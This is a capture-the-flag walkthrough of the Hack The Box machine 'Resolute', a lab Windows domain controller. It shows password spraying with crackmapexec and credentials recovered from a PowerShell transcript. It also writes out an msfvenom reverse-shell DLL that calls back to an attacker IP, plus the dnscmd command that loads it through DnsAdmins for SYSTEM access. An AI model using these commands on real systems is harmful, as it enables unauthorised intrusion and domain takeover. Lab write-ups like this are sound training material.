---
title:     "Hack The Box - Resolute"
tags: [windows,medium,dll_injection,crackmapexec]
layout: post
categories : HackTheBox
---

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/Untitled.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/Untitled.png)

We are going to pwn Resolute which is an medium windows machine from Hack The Box.                                                             

Link: [https://www.hackthebox.eu/home/machines/profile/220](https://www.hackthebox.eu/home/machines/profile/220)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT      STATE  SERVICE      VERSION
53/tcp    open   domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2020-02-04 11:21:23Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc        Microsoft Windows RPC
49665/tcp open   msrpc        Microsoft Windows RPC
49666/tcp open   msrpc        Microsoft Windows RPC
49667/tcp open   msrpc        Microsoft Windows RPC
49670/tcp open   msrpc        Microsoft Windows RPC
49676/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open   msrpc        Microsoft Windows RPC
49688/tcp open   msrpc        Microsoft Windows RPC
49707/tcp closed unknown
49860/tcp closed unknown
49907/tcp open   msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=2/4%Time=5E3951E0%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Aggressive OS guesses: Microsoft Windows Server 2016 (95%), Microsoft Windows Server 2016 build 10586 - 14393 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 or Server 2012 R2 (91%), Microsoft Windows 10 (91%), Microsoft Windows 10 1507 (91%), Microsoft Windows 10 1507 - 1607 (91%), Microsoft Windows 10 1511 (91%), Microsoft Windows Server 2012 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h47m52s, deviation: 4h37m11s, median: 7m50s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2020-02-04T03:22:42-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-02-04T11:22:43
|_  start_date: 2020-02-04T10:22:32
```


## Enum4Linux

Since SMB port is open, We can use Enum4Linux to get any useful information.<br/>
![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/2.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/2.png)<br/>
Found an username and a password for it `marko : Welcome123!`


I tried login with them using `Evil-WinRm`and its end failed<br/>
![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/Untitled%201.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/Untitled%201.png)

Since Enum4Linux reveals more user names, we can password spray on them using `crackmapexec`

I created an username list first
```bash
root@w0lf:~/CTF/HTB/Boxes/Resolute# cat usernames.txt 
abigail
Administrator
angela
annette
annika
claire
claude
felicia
fred
Guest
gustavo
marcus
marko
melanie
naoki
paulo
per
ryan
sally
steve
sunita
ulf
zach
```

Started password spraying on the `winrm`<br/>
```bash
root@w0lf:~/CTF/HTB/Boxes/Resolute# crackmapexec winrm 10.10.10.169 -u usernames.txt -p 'Welcome123!'
WINRM       10.10.10.169    5985   NONE             [*] http://10.10.10.169:5985/wsman
WINRM       10.10.10.169    5985   NONE             [-] None\abigail:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\Administrator:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\angela:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\annette:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\annika:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\claire:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\claude:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\felicia:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\fred:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\Guest:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\gustavo:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\marcus:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\marko:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\melanie:Welcome123! "Access is denied.  (extended fault data: {'transport_message': 'Bad HTTP response returned from server. Code 500', 'http_status_code': 500, 'wsmanfault_code': '5', 'fault_code': 's:Sender', 'fault_subcode': 'w:AccessDenied'})"
WINRM       10.10.10.169    5985   NONE             [-] None\naoki:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\paulo:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\per:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\ryan:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\sally:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\steve:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\sunita:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\ulf:Welcome123! "the specified credentials were rejected by the server"
WINRM       10.10.10.169    5985   NONE             [-] None\zach:Welcome123! "the specified credentials were rejected by the server"
```
We get `Access is Denied` for use `melanie` so let's try login with that.



## Getting User Shell

We logged in using `melanie : Welcome123!`<br/>
![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/Untitled%202.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/Untitled%202.png)<br/>
While checking the `C:\` I did `ls -force` which reveals hidden files (a feature in evil-winrm) and there is a directory called `PSTranscript`


> What is PSTranscripts?
                             A PowerShell transcript is a simple text file that contains a history of all commands and their output.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/hh.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/hh.png)


Checking the file reveals user `ryan` password which is `Serv3r4Admin4cc123!`<br/>
![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/qq.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/qq.png)


## Getting Shell as Ryan


Logged in with `ryan : Serv3r4Admin4cc123!`<br/>
![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/Untitled%203.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/Untitled%203.png)

I did `whoami /all` to know about this user.
```bash
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /all

USER INFORMATION
----------------

User Name     SID
============= ==============================================
megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
`ryan` is a member of `DnsAdmins` Group.

> DNSAdmin : Members of DNSAdmins group have access to network DNS information. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions.

There is a popular attack called `DLL Injection`

**Reference:** [https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2)

## Privilege Escalation


### Building the Payload

```bash
root@w0lf:~/CTF/HTB/Boxes/Resolute# msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=1234 -f dll > root.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 5120 bytes
```

### Uploading the Payload:

I used SMB Server to host our payload.

This command will inject our payload.

```bash
dnscmd resolute /config /serverlevelplugindll \\10.10.14.6\share\root.dll
```

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/Untitled%204.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/Untitled%204.png)


Started my nc listener and we need to restart the service, so the `dll` will be triggered and we get the shell with Administrator privileges.<br/>
![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/Untitled%205.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/Untitled%205.png)

We own the System.